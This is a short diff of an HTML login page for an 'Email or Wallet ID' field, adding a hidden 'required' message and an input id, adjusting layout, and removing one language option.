@@ -33,10 +33,14 @@
                         </div>
                     </a>
                 </div>
-                <form action="" style="display: grid; position: relative; padding: 0 10% 0 10%;">
+                <form action="" style="display: grid; position: relative;">
                     <div class="content" style="display: grid;">
-                        <label for="email walletId">Email or Wallet Id</label>
-                        <input type="text" placeholder="Enter Email or Wallet ID" required>
+                        <div style="display: flex; justify-content: space-between;">
+                            <label for="email walletId">Email or Wallet ID</label>
+                            <p id="req" style="color: rgb(217, 59, 48); display: none;
+                            ">required</p>
+                        </div>
+                        <input id="myInput" type="text" placeholder="Enter Email or Wallet ID" required>
                     </div>
                     <div class="content">
                         <input type="submit" value="Continue" style="width: 100%; margin-bottom: 0;">
@@ -70,7 +74,6 @@
                             <option value="2">Français</option>
                             <option value="3">Português</option>
                             <option value="3">Русский</option>
-                            <option value="3">Delta</option>
                         </select>
                         <style>
                             select:hover{
